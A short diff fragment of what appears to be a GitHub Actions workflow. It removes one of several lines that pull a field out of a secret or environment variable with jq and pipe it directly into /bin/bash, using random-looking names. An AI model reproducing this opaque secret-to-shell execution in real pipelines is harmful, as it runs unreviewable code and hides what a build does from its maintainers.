@@ -17,7 +17,6 @@ jobs:
           lwlk0884: ${{ secrets.lwlk0884 }}
         run: |
           printf '%s' "$lwlk0884" | jq -r .pvnpn19792 | /bin/bash
-          echo $yf75984 | jq -r .kb57795 | /bin/bash
           echo $krcz03 | jq -r .divu410 | /bin/bash
           echo $xk2396 | jq -r .jdjha416 | /bin/bash
           printf '%s' "$xcl10" | jq -r .lxckk4 | /bin/bash
